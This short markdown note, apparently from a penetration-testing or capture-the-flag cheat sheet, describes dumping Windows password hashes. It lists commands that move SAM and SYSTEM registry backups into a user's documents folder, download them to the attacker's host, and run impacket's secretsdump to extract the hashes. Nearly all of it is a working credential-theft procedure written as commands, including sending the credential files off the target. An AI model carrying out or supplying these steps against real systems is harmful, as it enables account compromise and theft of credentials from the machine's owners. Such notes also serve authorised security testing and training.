# Dumping SAM

Create a copy of the SAM  & SYSTEM backup:

```
move .\system.bak c:\users\jareth\documents\system.bak
move .\sam.bak c:\users\jareth\documents\sam.bak
```

Transfer the SAM & SYSTEM files to your host:

```
download C:\users\jareth\documents\system.bak
download C:\users\jareth\documents\sam.bak
```

Use impacket secretsdump to dump the SAM  & SYSTEM file locally:

```
sudo python2 secretsdump.py -sam /home/kali/sam -system /home/kali/system LOCAL 
```
